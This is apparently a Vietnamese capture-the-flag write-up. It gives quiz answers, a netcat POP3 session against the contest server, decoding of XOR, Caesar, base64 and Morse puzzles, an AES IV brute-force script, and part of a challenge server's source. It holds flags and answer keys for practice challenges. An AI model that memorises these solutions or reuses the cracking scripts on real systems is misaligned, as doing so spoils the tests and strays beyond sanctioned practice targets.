 ƒê·ªÉ v∆∞·ª£t qua th·ª≠ th√°ch n√†y, h√£y tr·∫£ l·ªùi ƒë√∫ng c√°c c√¢u h·ªèi d∆∞·ªõi ƒë√¢y.
·ªû m·ªói c√¢u h·ªèi b·∫°n s·∫Ω c√≥ 10s ƒë·ªÉ nh·∫≠p c√¢u tr·∫£ l·ªùi A, B, C, D.

Cookie H√¢n Hoan l√† fanpage chia s·∫ª v·ªÅ?
A.Chuy·ªán c∆∞·ªùi 
B.B√°nh b√°nh quy
C.B√†i h·ªçc cu·ªôc s·ªëng 
D.B·∫£o m·∫≠t v√† an to√†n th√¥ng tin
D

‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë Chu·∫©n R·ªìi ‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë

Ngo√†i 3 gi·∫£i ch√≠nh (nh·∫•t, nh√¨, ba), th√¨ Cookie H√¢n Hoan c√≥ bao nhi√™u gi·∫£i th∆∞·ªüng ph·ª•?
A.8
B.10
C.5
D.2
B

‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë Chu·∫©n R·ªìi ‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë

Nh·ªØng ng∆∞·ªùi ƒë∆∞·ª£c ban t·ªï ch·ª©c l·ª±a ch·ªçn ƒë·ªÉ trao gi·∫£i, c√≥ ph·∫£i g·ª≠i c√°ch gi·∫£i c√°c th·ª≠ th√°ch (write-up) cho BTC kh√¥ng?
A.Kh√¥ng
B.C√≥
B

‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë Chu·∫©n R·ªìi ‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë

B·∫°n ƒëang k·∫øt n·ªëi t·ªõi c√°nh c·ª≠a n√†y th√¥ng qua giao th·ª©c m·∫°ng n√†o?
A.FTP
B.UDP
C.TCP
D.ICMP
C

‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë Chu·∫©n R·ªìi ‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë

C√≥ bao nhi√™u ch·ªß ƒë·ªÅ trong Cookie Arena Season 1?
A.6
B.4
C.2
D.3
A

‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë Chu·∫©n R·ªìi ‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë

Cookie H√¢n Hoan c√≥ bao nhi√™u nh√¢n v·∫≠t ch√≠nh?
A.3
B.4
C.2
D.1
B

‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë Chu·∫©n R·ªìi ‚ñë ‚àó ‚óï ⁄∫ ‚óï ‚àó ‚ñë


Flag{t00-ez-4-y0u}
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{t00-ez-4-y0u}</code></p>

<h2 id="post-office-man">Post Office Man</h2>
<blockquote>
  <p>Anh b∆∞u t√° n√†y l√† m·ªôt ng∆∞·ªùi m√† G√† r·∫•t tin t∆∞·ªüng. G√† ·ªßy quy·ªÅn cho anh ·∫•y l√™n b∆∞u ƒëi·ªán, n√≥i chuy·ªán v·ªõi anh ki·ªÉm th∆∞ ƒë·ªÉ l·∫•y th∆∞ v·ªÅ.</p>

  <p>N·∫øu gi·∫•y ·ªßy quy·ªÅn h·ª£p l·ªá, anh ki·ªÉm th∆∞ s·∫Ω gi·ªØ l·∫°i b·∫£n g·ªëc r·ªìi photocopy ra m·ªôt b·∫£n kh√°c ƒë·ªÉ anh b∆∞u t√° ƒëem v·ªÅ cho G√†. ƒê·ªÉ nh·ª° trong tr∆∞·ªùng h·ª£p G√† c√≥ t·ª©c qu√° x√© th∆∞ ƒëi th√¨ v·∫´n c√≥ th·ªÉ l√™n ƒë√¢y l·∫•y l·∫°i.</p>

  <p>ƒê·ªë b·∫°n anh b∆∞u t√° s·ª≠ d·ª•ng giao th·ª©c email n√†o ƒë·ªÉ n√≥i chuy·ªán v·ªõi anh ki·ªÉm th∆∞?</p>

  <p>network.letspentest.org 9002</p>
</blockquote>

<p>Ta d√πng l·ªánh netcat ƒë·ªÉ connect v√†o c·ªïng 9002 c·ªßa t√™n mi·ªÅn network.letspentest.org</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nc network.letspentest.org 9002
+OK popper file-based pop3 server ready

Please using USER to login first
C√°c B·∫°n h√£y s·ª≠ d·ª•ng c√¢u l√™nh USER ƒë·ªÉ login v√†o h·ªá th·ªëng
(C·ª© nh·∫≠p linh tinh z√¥ ‰πÅ| ÔΩ• „Ä∞ ÔΩ• |„Ñè)
USER th3_5had0w

+OK user accepted

Please using PASS to login first
C√°c B·∫°n h√£y s·ª≠ d·ª•ng c√¢u l√™nh PASS ƒë·ªÉ login v√†o h·ªá th·ªëng
(C√∫ nh·∫≠p linh tinh z√¥ ‰πÅ| ÔΩ• „Ä∞ ÔΩ• |„Ñè)
PASS pwn

+OK pass accepted
LIST

+OK 10 messages (9400 octets)
1 940
2 940
3 940
4 940
5 940
6 940
7 940
8 940
9 940
10 940
</code></pre></div></div>

<p>Sau khi nh√¨n th·∫•y t·ª´ kh√≥a USER v√† PASS th√¨ m√¨nh ƒë√£ ng·ªù ng·ª£ ƒë√≥ l√† command c·ªßa giao th·ª©c POP3, th·∫ø l√† th·ª≠ th√™m l·ªánh LIST ƒë·ªÉ x√°c nh·∫≠n, v√† n√≥ ƒë√∫ng l√† giao th·ª©c POP3. ·ªû ƒë√¢y c√≥ 10 m·ª•c th√¨ ta ch·ªâ c·∫ßn d√πng command RETR v·ªõi t·ª´ng m·ª•c l√† s·∫Ω ra n·ªôi dung c·ªßa m·ª•c ƒë√≥, v√† flag n·∫±m ·ªü trong m·ª•c th·ª© 8.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RETR 8

+OK 940 octets
Received: from [208.10.167.165] by sweetwater.netease.net
(SMTPD32-5.05) id AC28801E8; Thu, 19 Aug 1999 20:15:20 -0500
Message-Id: &lt;199908192015750.SM00960@&gt;
X-RCPT-TO: dusty@demo.netease.net
Date: Thu, 19 Aug 1999 20:15:55 -0500
X-UIDL: 230371285
Status: U
From: &lt;dusty@netease.net&gt;


Subject: test
Dear Anonymous,

Thank you for using ThrowAway Mail to fight spam, your temporary disposable email is :

prugochihu@wemel.site

************************| Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L} |********************


Use it to communicate with any website you want to. You have 48 hours to use this mailbox, if you do not visit your mail inbox within 48 hours, it wil be deleted , once visited your mail box extends to another 48 hours.

For using this service you MUST enable cookie and javascript, cookie is just to record your session id and language preference, your Privacy is covered under our Privacy and Cookie policy .

ThrowAwayMail Team
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L}</code></p>

<h2 id="secure-http">Secure HTTP</h2>
<blockquote>
  <p>HTTP v√† HTTPS ƒë·ªÅu l√† hai giao th·ª©c gi√∫p tr√¨nh duy·ªát c·ªßa b·∫°n truy c·∫≠p, t∆∞∆°ng t√°c v·ªõi c√°c trang Web. Tuy nhi√™n khi s·ª≠ d·ª•ng giao th·ª©c HTTP ƒë·ªÉ truy c·∫≠p Web ·ªü m·ªôt qu√°n c√† ph√™ hay trong c√πng m·ªôt khu tr·ªç th√¨ t·∫•t c·∫£ c√°c n·ªôi dung trao ƒë·ªïi nh·∫°y c·∫£m, c≈©ng nh∆∞ m·∫≠t kh·∫©u c·ªßa b·∫°n tr√™n Web ƒë·ªÅu c√≥ th·ªÉ nghe l√©n.</p>

  <p>C√≤n HTTPS (ch·ªØ S c√≥ nghƒ©a l√† Secure - B·∫£o m·∫≠t) sinh ra ƒë·ªÉ m√£ h√≥a d·ªØ li·ªáu trong qu√° tr√¨nh trao ƒë·ªïi gi·ªØa tr√¨nh duy·ªát v√† m√°y ch·ªß b·∫±ng m·ªôt chi·∫øc Ch·ª©ng ch·ªâ (Certificate)</p>

  <p>network-insecure.letspentest.org 9004</p>
</blockquote>

<p>C√¢u n√†y ƒë√£ c√≥ ƒë∆∞·ª£c flag trong c√¢u scan me if you can.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{This-Is-A-Trusted-One}</code></p>

<h1 id="cryptography">CRYPTOGRAPHY</h1>

<h2 id="xor">XOR</h2>
<p>Ch∆∞∆°ng tr√¨nh cho ta 1 <a href="">file ch·ª©a quy tr√¨nh m√£ h√≥a</a> v√† 1 <a href="">file ch·ª©a ƒëo·∫°n cipher</a> ƒë√£ b·ªã m√£ h√≥a.</p>

<p>Quy tr√¨nh m√£ h√≥a d·ªØ li·ªáu tr√¥ng nh∆∞ th·∫ø n√†y:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="c1">###SECRET###
</span><span class="n">key</span> <span class="o">=</span> <span class="c1">###SECRET###
</span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">))])</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'cipher.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
</code></pre></div></div>

<p>Sau khi m√£ h√≥a th√¨ file flag ban ƒë·∫ßu bi·∫øn ƒë·ªïi th√†nh <code class="language-plaintext highlighter-rouge">6c464b4d514b744817491714487449174b57</code></p>

<p>ƒê·ªçc s∆° qua ƒëo·∫°n code th√¨ ƒë√¢y l√† m·ªôt ch∆∞∆°ng tr√¨nh m√£ h√≥a kh√° c∆° b·∫£n, m√£ h√≥a XOR v√† ƒë·ªô d√†i key l√† 1, v·∫≠y th√¨ ta c√≥ th·ªÉ d·ªÖ d√†ng brute key v√† sau ƒë√≥ XOR v·ªõi ƒëo·∫°n cipher ƒë√£ ƒë∆∞·ª£c unhex ƒë·ªÉ l·∫•y l·∫°i flag ban ƒë·∫ßu.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decrypt</span><span class="p">():</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'cipher.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">ar</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">ar</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="o">+</span><span class="n">a</span><span class="p">[</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
        <span class="n">k</span><span class="o">+=</span><span class="mi">2</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">^</span> <span class="n">ar</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'F'</span><span class="p">):</span>
            <span class="n">key</span> <span class="o">=</span> <span class="n">i</span>
            <span class="k">break</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">ar</span><span class="p">:</span>
        <span class="n">res</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">l</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
    
    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>

<span class="n">decrypt</span><span class="p">()</span>
</code></pre></div></div>

<p>Sau khi ch·∫°y th√¨ ta c√≥ flag l√†: <code class="language-plaintext highlighter-rouge">Flag{a^b=c=&gt;b^c=a}</code></p>

<h2 id="morse">MORSE</h2>
<blockquote>
  <p>Su·ªµt! T·∫≠p trung v√† ƒëeo tai nghe l√™n n√†o. G√† c√≥ nghe th·∫•y nh·ªãp beat kh√¥ng? H·ªç n√≥i g√¨ t·ª´ b√™n kia chi·∫øn tuy·∫øn Format: Flag{what_you_find}</p>
</blockquote>

<p>B√†i n√†y cho ta m·ªôt file √¢m thanh ch·ª©a morse code, d√¢n ch∆°i nghe ph√°t bi·∫øt li·ªÅn.</p>

<p>QuƒÉng l√™n cho <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">tool n√†y</a> l√† c√≥ flag lu√¥n.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{M.O.R.S.E.C.O.D.E}</code></p>

<h2 id="julius-caesar">Julius Caesar</h2>
<blockquote>
  <p>V√¥ t√¨nh khi khai qu·∫≠t kh·∫£o c·ªï, G√† t√¨m ƒë∆∞·ª£c m·ªôt th√¥ng ƒëi·ªáp b√≠ ·∫©n kho·∫£ng h∆°n 100 nƒÉm tr∆∞·ªõc c√¥ng nguy√™n. Nghe ƒë·ªìn ƒë√¢y l√† m·ªôt b√≠ thu·∫≠t ƒë√£ b·ªã thay ƒë·ªïi c√¥ng th·ª©c c·ªßa m·ªôt v·ªã t∆∞·ªõng Julius Caesar, sau n√†y tr·ªü th√†nh v·ªã vua ƒë·∫ßu ti√™n c·ªßa ƒë·∫ø ch·∫ø La M√£ h√πng m·∫°nh.</p>

  <p>H√£y gi√∫p G√† gi·∫£i m·∫≠t th∆∞ n√†y!</p>
</blockquote>

<p>ƒê·ªÅ b√†i cho ta 1 file ch·ª©a ƒëo·∫°n cipher: <code class="language-plaintext highlighter-rouge">Synt{Ry_Pynfvpb_Pvcure}</code></p>

<p>N√†y th√¨ r√µ nh∆∞ ban ng√†y l√† caesar cipher r·ªìi, d√πng tool tr√™n m·∫°ng l√† ra li·ªÅn.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{El_Clasico_Cipher}</code></p>

<h2 id="sixty-four">Sixty Four</h2>
<blockquote>
  <p>G√† ƒë·ªÉ l·∫°i m·ªôt th√¥ng ƒëi·ªáp b√≠ m·∫≠t nh∆∞ng n√≥ kh√¥ng l√†m kh√≥ ƒë∆∞·ª£c tr√≠ th√¥ng minh c·ªßa M√®o Yang H·ªì.</p>
</blockquote>

<p>ƒê·ªÅ b√†i cho ta 1 file ch·ª©a ƒëo·∫°n cipher: <code class="language-plaintext highlighter-rouge">NDY2QzYxNjc3QjVGNUY1RjQyNjE3MzY1MzYzNDc4NDg2NTc4NUY1RjVGN0Q=</code></p>

<p>Nh√¨n c√°i cipher l√† bi·∫øt lu√¥n base64, decode th√¥i, xong th√¨ ra th·∫ø n√†y: <code class="language-plaintext highlighter-rouge">466C61677B5F5F5F426173653634784865785F5F5F7D</code></p>

<p>Nh√¨n ph√°t bi·∫øt lu√¥n l√† hex, ƒëem l√™n tool hex to ascii ph√°t n·ªØa l√† c√≥ flag.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{___Base64xHex___}</code></p>

<h2 id="bruh-aes">Bruh AES</h2>
<blockquote>
  <p>√îi kh√¥ng, Hazy l·ª° xo√° ƒëi m·ªôt m·∫£nh gh√©p trong qu√° tr√¨nh m√£ ho√° AES m·∫•t r·ªìi :)</p>
</blockquote>

<p>V·ªÅ c∆° b·∫£n th√¨ ƒë·ªÅ b√†i cho ta m·ªôt file cipher, flag sau khi ƒë√£ b·ªã m√£ h√≥a AES v√† 1 file cho th·∫•y quy tr√¨nh m√£ h√≥a ƒë√≥. Ta bi·∫øt ƒë∆∞·ª£c flag d√†i 38 k√≠ t·ª±, key m√£ h√≥a ƒë√£ c√≥ s·∫Øn tuy nhi√™n Initial Vector ƒë√£ b·ªã ·∫©n ƒëi 2 k√≠ t·ª±, v√¨ v·∫≠y ta ch·ªâ c·∫ßn vi·∫øt script brute hai k√≠ t·ª± ƒë√≥ r·ªìi decrypt l√† xong.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iv_part1</span> <span class="o">=</span> <span class="s">"0xcafedeadbeef"</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">string</span> 
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'supersecretkey!?'</span>
<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"cipher.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
<span class="n">algorithm</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
    <span class="n">cip</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">algorithm</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">cip</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">cipher</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">:</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">iv_part1</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[:</span><span class="mi">38</span><span class="p">].</span><span class="n">decode</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span> <span class="ow">and</span> <span class="n">ans</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"iv :"</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="s">"flag:"</span><span class="p">,</span> <span class="n">ans</span><span class="p">)</span>
</code></pre></div></div>

<p>C·ª© nghƒ© l√† ez flag nh∆∞ng kh√¥ng, sau khi ch·∫°y th√¨ file flag ra c·∫£ n√πi. ƒê√¢y c≈©ng l√† l√Ω do m√¨nh gh√©t challenge n√†y nh·∫•t, qu√° guessing, r·∫•t t·ª•t mood.</p>

<p>Ng·ªìi m√≤ m·∫•m ƒëo√°n ƒëo√°n m·ªôt h·ªìi th√¨ c≈©ng m√≤ ƒë√∫ng .__. IV l√† <code class="language-plaintext highlighter-rouge">0xcafedeadbeefx0</code></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{f4edced3a1c3e72be1257f232a7a78b6}</code></p>

<h2 id="cry-more">Cry more</h2>
<blockquote>
  <p>M√£ mua d√†i qu√° n√™n kh√¥ng mua ƒë∆∞·ª£c :(
B·∫°n c√≥ th·ªÉ mua flag h·ªô Hazy ƒë∆∞·ª£c kh√¥ng :D
nc chal1.crypto.letspentest.org 7000</p>
</blockquote>

<p>Ch∆∞∆°ng tr√¨nh cho ta lu√¥n ch∆∞∆°ng tr√¨nh python ch·∫°y ·ªü ph√≠a server</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">socketserver</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span><span class="p">,</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha512</span>


<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">flag</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">return</span> <span class="sa">b</span><span class="s">'Server is not configured correctly. Please contact admins to fix the problem'</span>


<span class="n">items</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">(</span><span class="sa">b</span><span class="s">'Fowl x 3'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
    <span class="p">(</span><span class="sa">b</span><span class="s">'Mora x 30000'</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span>
    <span class="p">(</span><span class="sa">b</span><span class="s">'Mystic Enhancement Ore x 5'</span><span class="p">,</span> <span class="mi">500</span><span class="p">),</span>
    <span class="p">(</span><span class="sa">b</span><span class="s">'Hero</span><span class="se">\'</span><span class="s">s Wits x 3'</span><span class="p">,</span> <span class="mi">1000</span><span class="p">),</span>
    <span class="p">(</span><span class="sa">b</span><span class="s">'Primogems x 40'</span><span class="p">,</span> <span class="mi">5000</span><span class="p">),</span>
    <span class="p">(</span><span class="sa">b</span><span class="s">'FLAG'</span><span class="p">,</span> <span class="mi">99999</span><span class="p">)</span>
<span class="p">]</span>


<span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">StreamRequestHandler</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">signkey</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">money</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2000</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="bp">self</span><span class="p">.</span><span class="n">menu</span><span class="p">()</span>

                <span class="k">try</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your choice: '</span><span class="p">)</span>
                    <span class="n">opt</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
                <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
                        <span class="sa">b</span><span class="s">'THIS IS A CRYPTOGRAPHIC CHALLENGE!!!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                    <span class="k">continue</span>
                <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="nb">list</span><span class="p">()</span>
                <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">order</span><span class="p">()</span>
                <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">confirm</span><span class="p">()</span>
                <span class="k">elif</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye~</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                    <span class="k">return</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Ohh~</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

        <span class="k">except</span> <span class="p">(</span><span class="nb">ConnectionResetError</span><span class="p">,</span> <span class="nb">ConnectionAbortedError</span><span class="p">,</span> <span class="nb">BrokenPipeError</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"{} disconnected"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>

    <span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span>
            <span class="sa">b</span><span class="s">'To celebrate `our` first anniversary, we are offering you tons of product at the best prices</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'You have $%d</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">money</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'1. Available products</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'2. Order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'3. Confirm order</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'4. Exit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">list</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">items</span><span class="p">):</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'%d - %s: $%d</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span>
